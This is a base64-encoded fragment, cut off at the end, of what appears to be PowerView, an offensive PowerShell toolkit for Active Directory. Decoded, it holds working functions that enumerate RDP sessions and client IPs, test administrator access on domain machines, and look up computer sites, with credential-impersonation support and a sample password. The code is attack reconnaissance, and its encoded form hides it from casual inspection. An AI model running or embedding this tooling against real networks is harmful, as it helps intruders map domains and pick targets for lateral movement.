ICAgICAgICBpZiAoJEhhbmRsZSAtbmUgMCkgewoKICAgICAgICAgICAgICAgICMgYXJndW1lbnRzIGZvciBXVFNFbnVtZXJhdGVTZXNzaW9uc0V4CiAgICAgICAgICAgICAgICAkcHBTZXNzaW9uSW5mbyA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICAgICAkcENvdW50ID0gMAoKICAgICAgICAgICAgICAgICMgZ2V0IGluZm9ybWF0aW9uIG9uIGFsbCBjdXJyZW50IHNlc3Npb25zCiAgICAgICAgICAgICAgICAkUmVzdWx0ID0gJFd0c2FwaTMyOjpXVFNFbnVtZXJhdGVTZXNzaW9uc0V4KCRIYW5kbGUsIFtyZWZdMSwgMCwgW3JlZl0kcHBTZXNzaW9uSW5mbywgW3JlZl0kcENvdW50KTskTGFzdEVycm9yID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCgogICAgICAgICAgICAgICAgIyBsb2NhdGUgdGhlIG9mZnNldCBvZiB0aGUgaW5pdGlhbCBpbnRQdHIKICAgICAgICAgICAgICAgICRPZmZzZXQgPSAkcHBTZXNzaW9uSW5mby5Ub0ludDY0KCkKCiAgICAgICAgICAgICAgICBpZiAoKCRSZXN1bHQgLW5lIDApIC1hbmQgKCRPZmZzZXQgLWd0IDApKSB7CgogICAgICAgICAgICAgICAgICAgICMgd29yayBvdXQgaG93IG11Y2ggdG8gaW5jcmVtZW50IHRoZSBwb2ludGVyIGJ5IGZpbmRpbmcgb3V0IHRoZSBzaXplIG9mIHRoZSBzdHJ1Y3R1cmUKICAgICAgICAgICAgICAgICAgICAkSW5jcmVtZW50ID0gJFdUU19TRVNTSU9OX0lORk9fMTo6R2V0U2l6ZSgpCgogICAgICAgICAgICAgICAgICAgICMgcGFyc2UgYWxsIHRoZSByZXN1bHQgc3RydWN0dXJlcwogICAgICAgICAgICAgICAgICAgIGZvciAoJGkgPSAwOyAoJGkgLWx0ICRwQ291bnQpOyAkaSsrKSB7CgogICAgICAgICAgICAgICAgICAgICAgICAjIGNyZWF0ZSBhIG5ldyBpbnQgcHRyIGF0IHRoZSBnaXZlbiBvZmZzZXQgYW5kIGNhc3QgdGhlIHBvaW50ZXIgYXMgb3VyIHJlc3VsdCBzdHJ1Y3R1cmUKICAgICAgICAgICAgICAgICAgICAgICAgJE5ld0ludFB0ciA9IE5ldy1PYmplY3QgU3lzdGVtLkludHB0ciAtQXJndW1lbnRMaXN0ICRPZmZzZXQKICAgICAgICAgICAgICAgICAgICAgICAgJEluZm8gPSAkTmV3SW50UHRyIC1hcyAkV1RTX1NFU1NJT05fSU5GT18xCgogICAgICAgICAgICAgICAgICAgICAgICAkUkRQU2Vzc2lvbiA9IE5ldy1PYmplY3QgUFNPYmplY3QKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkSW5mby5wSG9zdE5hbWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSRFBTZXNzaW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJEluZm8ucEhvc3ROYW1lCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIGlmIG5vIGhvc3RuYW1lIHJldHVybmVkLCB1c2UgdGhlIHNwZWNpZmllZCBob3N0bmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJEUFNlc3Npb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgJFJEUFNlc3Npb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU2Vzc2lvbk5hbWUnICRJbmZvLnBTZXNzaW9uTmFtZQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCQoLW5vdCAkSW5mby5wRG9tYWluTmFtZSkgLW9yICgkSW5mby5wRG9tYWluTmFtZSAtZXEgJycpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIGlmIGEgZG9tYWluIGlzbid0IHJldHVybmVkIGp1c3QgdXNlIHRoZSB1c2VybmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJEUFNlc3Npb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlck5hbWUnICIkKCRJbmZvLnBVc2VyTmFtZSkiCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUkRQU2Vzc2lvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyTmFtZScgIiQoJEluZm8ucERvbWFpbk5hbWUpXCQoJEluZm8ucFVzZXJOYW1lKSIKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgJFJEUFNlc3Npb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSUQnICRJbmZvLlNlc3Npb25JRAogICAgICAgICAgICAgICAgICAgICAgICAkUkRQU2Vzc2lvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTdGF0ZScgJEluZm8uU3RhdGUKCiAgICAgICAgICAgICAgICAgICAgICAgICRwcEJ1ZmZlciA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICAgICAgICAgICAgICRwQnl0ZXNSZXR1cm5lZCA9IDAKCiAgICAgICAgICAgICAgICAgICAgICAgICMgcXVlcnkgZm9yIHRoZSBzb3VyY2UgY2xpZW50IElQIHdpdGggV1RTUXVlcnlTZXNzaW9uSW5mb3JtYXRpb24KICAgICAgICAgICAgICAgICAgICAgICAgIyAgIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvYWEzODM4NjEodj12cy44NSkuYXNweAogICAgICAgICAgICAgICAgICAgICAgICAkUmVzdWx0MiA9ICRXdHNhcGkzMjo6V1RTUXVlcnlTZXNzaW9uSW5mb3JtYXRpb24oJEhhbmRsZSwgJEluZm8uU2Vzc2lvbklELCAxNCwgW3JlZl0kcHBCdWZmZXIsIFtyZWZdJHBCeXRlc1JldHVybmVkKTskTGFzdEVycm9yMiA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRSZXN1bHQyIC1lcSAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LU5ldFJEUFNlc3Npb25dIEVycm9yOiAkKChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRMYXN0RXJyb3IyKS5NZXNzYWdlKSIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPZmZzZXQyID0gJHBwQnVmZmVyLlRvSW50NjQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5ld0ludFB0cjIgPSBOZXctT2JqZWN0IFN5c3RlbS5JbnRwdHIgLUFyZ3VtZW50TGlzdCAkT2Zmc2V0MgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEluZm8yID0gJE5ld0ludFB0cjIgLWFzICRXVFNfQ0xJRU5UX0FERFJFU1MKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU291cmNlSVAgPSAkSW5mbzIuQWRkcmVzcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRTb3VyY2VJUFsyXSAtbmUgMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTb3VyY2VJUCA9IFtTdHJpbmddJFNvdXJjZUlQWzJdKycuJytbU3RyaW5nXSRTb3VyY2VJUFszXSsnLicrW1N0cmluZ10kU291cmNlSVBbNF0rJy4nK1tTdHJpbmddJFNvdXJjZUlQWzVdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU291cmNlSVAgPSAkTnVsbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSRFBTZXNzaW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1NvdXJjZUlQJyAkU291cmNlSVAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSRFBTZXNzaW9uLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5SRFBTZXNzaW9uSW5mbycpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUkRQU2Vzc2lvbgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgZnJlZSB1cCB0aGUgbWVtb3J5IGJ1ZmZlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE51bGwgPSAkV3RzYXBpMzI6OldUU0ZyZWVNZW1vcnkoJHBwQnVmZmVyKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPZmZzZXQgKz0gJEluY3JlbWVudAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICMgZnJlZSB1cCB0aGUgbWVtb3J5IHJlc3VsdCBidWZmZXIKICAgICAgICAgICAgICAgICAgICAkTnVsbCA9ICRXdHNhcGkzMjo6V1RTRnJlZU1lbW9yeUV4KDIsICRwcFNlc3Npb25JbmZvLCAkcENvdW50KQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1OZXRSRFBTZXNzaW9uXSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkTGFzdEVycm9yKS5NZXNzYWdlKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICMgY2xvc2Ugb2ZmIHRoZSBzZXJ2aWNlIGhhbmRsZQogICAgICAgICAgICAgICAgJE51bGwgPSAkV3RzYXBpMzI6OldUU0Nsb3NlU2VydmVyKCRIYW5kbGUpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LU5ldFJEUFNlc3Npb25dIEVycm9yIG9wZW5pbmcgdGhlIFJlbW90ZSBEZXNrdG9wIFNlc3Npb24gSG9zdCAoUkQgU2Vzc2lvbiBIb3N0KSBzZXJ2ZXIgZm9yOiAkQ29tcHV0ZXJOYW1lIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIEVORCB7CiAgICAgICAgaWYgKCRMb2dvblRva2VuKSB7CiAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYgLVRva2VuSGFuZGxlICRMb2dvblRva2VuCiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gVGVzdC1BZG1pbkFjY2VzcyB7CjwjCi5TWU5PUFNJUwoKVGVzdHMgaWYgdGhlIGN1cnJlbnQgdXNlciBoYXMgYWRtaW5pc3RyYXRpdmUgYWNjZXNzIHRvIHRoZSBsb2NhbCAob3IgYSByZW1vdGUpIG1hY2hpbmUuCgpJZGVhIHN0b2xlbiBmcm9tIHRoZSBsb2NhbF9hZG1pbl9zZWFyY2hfZW51bSBwb3N0IG1vZHVsZSBpbiBNZXRhc3Bsb2l0IHdyaXR0ZW4gYnk6ICAKICAgICdCcmFuZG9uIE1jQ2FubiAiemVrbm94IiA8Ym1jY2FublthdF1hY2N1dmFudC5jb20+JyAgCiAgICAnVGhvbWFzIE1jQ2FydGh5ICJzbWlsaW5ncmFjY29vbiIgPHNtaWxpbmdyYWNjb29uW2F0XWdtYWlsLmNvbT4nICAKICAgICdSb3ljZSBEYXZpcyAicjNkeSIgPHJkYXZpc1thdF1hY2N1dmFudC5jb20+JyAgCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IFBTUmVmbGVjdCwgSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uLCBJbnZva2UtUmV2ZXJ0VG9TZWxmICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiB3aWxsIHVzZSB0aGUgT3BlblNDTWFuYWdlclcgV2luMzJBUEkgY2FsbCB0byBlc3RhYmxpc2gKYSBoYW5kbGUgdG8gdGhlIHJlbW90ZSBob3N0LiBJZiB0aGlzIHN1Y2NlZWRzLCB0aGUgY3VycmVudCB1c2VyIGNvbnRleHQKaGFzIGxvY2FsIGFkbWluaXN0cmF0b3IgYWNlc3MgdG8gdGhlIHRhcmdldC4KCi5QQVJBTUVURVIgQ29tcHV0ZXJOYW1lCgpTcGVjaWZpZXMgdGhlIGhvc3RuYW1lIHRvIGNoZWNrIGZvciBsb2NhbCBhZG1pbiBhY2Nlc3MgKGFsc28gYWNjZXB0cyBJUCBhZGRyZXNzZXMpLgpEZWZhdWx0cyB0byAnbG9jYWxob3N0Jy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgcmVtb3RlIHN5c3RlbSB1c2luZyBJbnZva2UtVXNlckltcGVyc29uYXRpb24uCgouRVhBTVBMRQoKVGVzdC1BZG1pbkFjY2VzcyAtQ29tcHV0ZXJOYW1lIHNxbHNlcnZlcgoKUmV0dXJucyByZXN1bHRzIGluZGljYXRpbmcgd2hldGhlciB0aGUgY3VycmVudCB1c2VyIGhhcyBhZG1pbiBhY2Nlc3MgdG8gdGhlICdzcWxzZXJ2ZXInIGhvc3QuCgouRVhBTVBMRQoKR2V0LURvbWFpbkNvbXB1dGVyIHwgVGVzdC1BZG1pbkFjY2VzcwoKUmV0dXJucyB3aGF0IG1hY2hpbmVzIGluIHRoZSBkb21haW4gdGhlIGN1cnJlbnQgdXNlciBoYXMgYWNjZXNzIHRvLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpClRlc3QtQWRtaW5BY2Nlc3MgLUNvbXB1dGVyTmFtZSBzcWxzZXJ2ZXIgLUNyZWRlbnRpYWwgJENyZWQKCi5PVVRQVVRTCgpQb3dlclZpZXcuQWRtaW5BY2Nlc3MKCkEgUFNDdXN0b21PYmplY3QgY29udGFpbmluZyB0aGUgQ29tcHV0ZXJOYW1lIGFuZCAnSXNBZG1pbicgc2V0IHRvIHdoZXRoZXIKdGhlIGN1cnJlbnQgdXNlciBoYXMgbG9jYWwgYWRtaW4gcmlnaHRzLCBhbG9uZyB3aXRoIHRoZSBDb21wdXRlck5hbWUgYWRkZWQuCgouTElOSwoKaHR0cHM6Ly9naXRodWIuY29tL3JhcGlkNy9tZXRhc3Bsb2l0LWZyYW1ld29yay9ibG9iL21hc3Rlci9tb2R1bGVzL3Bvc3Qvd2luZG93cy9nYXRoZXIvbG9jYWxfYWRtaW5fc2VhcmNoX2VudW0ucmIKaHR0cDovL3d3dy5wb3dlcnNoZWxsbWFnYXppbmUuY29tLzIwMTQvMDkvMjUvZWFzaWx5LWRlZmluaW5nLWVudW1zLXN0cnVjdHMtYW5kLXdpbjMyLWZ1bmN0aW9ucy1pbi1tZW1vcnkvCiM+CgogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5BZG1pbkFjY2VzcycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAnbG9jYWxob3N0JywKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAjIDB4RjAwM0YgLSBTQ19NQU5BR0VSX0FMTF9BQ0NFU1MKICAgICAgICAgICAgIyAgIGh0dHA6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS93aW5kb3dzL2Rlc2t0b3AvbXM2ODU5ODEodj12cy44NSkuYXNweAogICAgICAgICAgICAkSGFuZGxlID0gJEFkdmFwaTMyOjpPcGVuU0NNYW5hZ2VyVygiXFwkQ29tcHV0ZXIiLCAnU2VydmljZXNBY3RpdmUnLCAweEYwMDNGKTskTGFzdEVycm9yID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCgogICAgICAgICAgICAkSXNBZG1pbiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgJElzQWRtaW4gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKCiAgICAgICAgICAgICMgaWYgd2UgZ2V0IGEgbm9uLXplcm8gaGFuZGxlIGJhY2ssIGV2ZXJ5dGhpbmcgd2FzIHN1Y2Nlc3NmdWwKICAgICAgICAgICAgaWYgKCRIYW5kbGUgLW5lIDApIHsKICAgICAgICAgICAgICAgICROdWxsID0gJEFkdmFwaTMyOjpDbG9zZVNlcnZpY2VIYW5kbGUoJEhhbmRsZSkKICAgICAgICAgICAgICAgICRJc0FkbWluIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lzQWRtaW4nICRUcnVlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbVGVzdC1BZG1pbkFjY2Vzc10gRXJyb3I6ICQoKFtDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbl0gJExhc3RFcnJvcikuTWVzc2FnZSkiCiAgICAgICAgICAgICAgICAkSXNBZG1pbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJc0FkbWluJyAkRmFsc2UKICAgICAgICAgICAgfQogICAgICAgICAgICAkSXNBZG1pbi5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuQWRtaW5BY2Nlc3MnKQogICAgICAgICAgICAkSXNBZG1pbgogICAgICAgIH0KICAgIH0KCiAgICBFTkQgewogICAgICAgIGlmICgkTG9nb25Ub2tlbikgewogICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmIC1Ub2tlbkhhbmRsZSAkTG9nb25Ub2tlbgogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1OZXRDb21wdXRlclNpdGVOYW1lIHsKPCMKLlNZTk9QU0lTCgpSZXR1cm5zIHRoZSBBRCBzaXRlIHdoZXJlIHRoZSBsb2NhbCAob3IgYSByZW1vdGUpIG1hY2hpbmUgcmVzaWRlcy4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogUFNSZWZsZWN0LCBJbnZva2UtVXNlckltcGVyc29uYXRpb24sIEludm9rZS1SZXZlcnRUb1NlbGYgIAoKLkRFU0NSSVBUSU9OCgpUaGlzIGZ1bmN0aW9uIHdpbGwgdXNlIHRoZSBEc0dldFNpdGVOYW1lIFdpbjMyQVBJIGNhbGwgdG8gbG9vayB1cCB0aGUKbmFtZSBvZiB0aGUgc2l0ZSB3aGVyZSBhIHNwZWNpZmllZCBjb21wdXRlciByZXNpZGVzLgoKLlBBUkFNRVRFUiBDb21wdXRlck5hbWUKClNwZWNpZmllcyB0aGUgaG9zdG5hbWUgdG8gY2hlY2sgdGhlIHNpdGUgZm9yIChhbHNvIGFjY2VwdHMgSVAgYWRkcmVzc2VzKS4KRGVmYXVsdHMgdG8gJ2xvY2FsaG9zdCcuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHJlbW90ZSBzeXN0ZW0gdXNpbmcgSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uLgoKLkVYQU1QTEUKCkdldC1OZXRDb21wdXRlclNpdGVOYW1lIC1Db21wdXRlck5hbWUgV0lORE9XUzEudGVzdGxhYi5sb2NhbAoKUmV0dXJucyB0aGUgc2l0ZSBmb3IgV0lORE9XUzEudGVzdGxhYi5sb2NhbC4KCi5FWEFNUExFCgpHZXQtRG9tYWluQ29tcHV0ZXIgfCBHZXQtTmV0Q29tcHV0ZXJTaXRlTmFtZQoKUmV0dXJucyB0aGUgc2l0ZXMgZm9yIGV2ZXJ5IG1hY2hpbmUgaW4gQUQuCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LU5ldENvbXB1dGVyU2l0ZU5hbWUgLUNvbXB1dGVyTmFtZSBXSU5ET1dTMS50ZXN0bGFiLmxvY2FsIC1DcmVkZW50aWFsICRDcmVkCgouT1VUUFVUUwoKUG93ZXJWaWV3LkNvbXB1dGVyU2l0ZQoKQSBQU0N1c3RvbU9iamVjdCBjb250YWluaW5nIHRoZSBDb21wdXRlck5hbWUsIElQQWRkcmVzcywgYW5kIGFzc29jaWF0ZWQgU2l0ZSBuYW1lLgojPgoKICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuQ29tcHV0ZXJTaXRlJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0TmFtZScsICdkbnNob3N0bmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICdsb2NhbGhvc3QnLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICMgaWYgd2UgZ2V0IGFuIElQIGFkZHJlc3MsIHRyeSB0byByZXNvbHZlIHRoZSBJUCB0byBhIGhvc3RuYW1lCiAgICAgICAgICAgIGlmICgkQ29tcHV0ZXIgLW1hdGNoICdeKD86WzAtOV17MSwzfVwuKXszfVswLTldezEsM30kJykgewogICAgICAgICAgICAgICAgJElQQWRkcmVzcyA9ICRDb21wdXRlcgogICAgICAgICAgICAgICAgJENvbXB1dGVyID0gW1N5c3RlbS5OZXQuRG5zXTo6R2V0SG9zdEJ5QWRkcmVzcygkQ29tcHV0ZXIpIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgSG9zdE5hbWUKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRJUEFkZHJlc3MgPSBAKFJlc29sdmUtSVBBZGRyZXNzIC1Db21wdXRlck5hbWUgJENvbXB1dGVyKVswXS5JUEFkZHJlc3MKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJFB0ckluZm8gPSBbSW50UHRyXTo6WmVybwoKICAgICAgICAgICAgJFJlc3VsdCA9ICROZXRhcGkzMjo6RHNHZXRTaXRlTmFtZSgkQ29tcHV0ZXIsIFtyZWZdJFB0ckluZm8pCgogICAgICAgICAgICAkQ29tcHV0ZXJTaXRlID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAkQ29tcHV0ZXJTaXRlIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyCiAgICAgICAgICAgICRDb21wdXRlclNpdGUgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSVBBZGRyZXNzJyAkSVBBZGRyZXNzCgogICAgICAgICAgICBpZiAoJFJlc3VsdCAtZXEgMCkgewogICAgICAgICAgICAgICAgJFNpdGVuYW1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJpbmdBdXRvKCRQdHJJbmZvKQogICAgICAgICAgICAgICAgJENvbXB1dGVyU2l0ZSB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTaXRlTmFtZScgJFNpdGVuYW1lCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LU5ldENvbXB1dGVyU2l0ZU5hbWVdIEVycm9yOiAkKChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRSZXN1bHQpLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgJENvbXB1dGVyU2l0ZSB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTaXRlTmFtZScgJycKICAgICAgICAgICAgfQogICAgICAgICAgICAkQ29tcHV0ZXJTaXRlLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Db21wdXRlclNpdGUnKQoKICAgICAgICAgICAgIyBmcmVlIHVwIHRoZSByZXN1bHQgYnVmZmVyCiAgICAgICAgICAgICROdWxsID0gJE5ldGFwaTMyOjpOZXRBcGlCdWZmZXJGcmVlKCRQdHJJbmZvKQoKICAgICAgICAgICAgJENvbXB1dGVyU2l0ZQogICAgICAgIH0KICAgIH0KCiAgICBFTkQgewogICAgICAgIGlmICgkTG9nb25Ub2tlbikgewogICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmIC1Ub2tlbkhhbmRsZSAkTG9nb25Ub2tlbgogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1XTUlSZWdQcm94eSB7CjwjCi5TWU5PUFNJUwoKRW51bWVyYXRlcyB0aGUgcHJveHkgc2VydmVyIGFuZCBXUEFEIGNvbmVudHMgZm9yIHRoZSBjdXJyZW50IHVzZXIuCgpBdXR